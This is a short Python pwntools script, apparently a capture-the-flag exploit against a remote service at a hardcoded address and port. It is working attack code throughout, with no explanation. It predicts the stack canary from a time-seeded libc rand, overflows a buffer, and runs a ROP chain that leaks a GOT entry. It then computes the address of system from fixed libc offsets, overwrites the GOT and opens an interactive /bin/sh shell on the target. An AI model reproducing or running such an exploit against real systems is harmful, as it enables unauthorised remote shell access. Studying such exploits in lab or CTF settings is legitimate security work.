from ctypes import CDLL
from pwn import *
libc = CDLL("libc.so.6")
r = remote("111.111.111.77", 3452)
libc.srand(libc.time(0))
r.recvuntil("input: ")
CANARI = libc.rand()
CANARI += libc.rand()*0x100000000
print hex(CANARI)
rsipr = 0x00400a51
got = 0x601018
write = 0x4006B0
read = 0x4006E0
rdir = 0x00400a53
rbxpr = 0x004008f6 
payload = "A"*136+p64(CANARI)+"\x00"*8
payload += p64(rsipr)
payload += p64(got)
payload += p64(0)
payload += p64(write)
payload += p64(rdir)
payload += p64(0)
payload += p64(read)
payload += p64(rdir)
payload += p64(got)
payload += p64(write)

r.send(payload)
libc.sleep(1)
r.recvuntil(p64(CANARI))
print hex(u64(r.recv(8)))
system = u64(r.recv(8))-0xef380+0x46590
r.send("/bin/sh\x00"+p64(system))
r.interactive()

